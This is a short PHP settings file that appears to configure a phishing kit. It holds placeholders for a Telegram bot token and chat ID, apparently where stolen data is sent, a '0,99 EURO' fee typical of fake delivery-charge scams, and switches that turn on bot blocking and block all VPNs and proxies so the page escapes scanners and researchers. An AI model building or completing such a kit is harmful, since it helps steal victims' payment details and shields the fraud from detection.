<?php 



$bot = "your-token";
$chat_id = "chatid";


// add fees.
$fees = "0,99 EURO ";


// use antibot? yes|no
$antibot = "yes";

// want to block all VPNs/PROXIES? yes|no
$block_proxy = "yes";




?>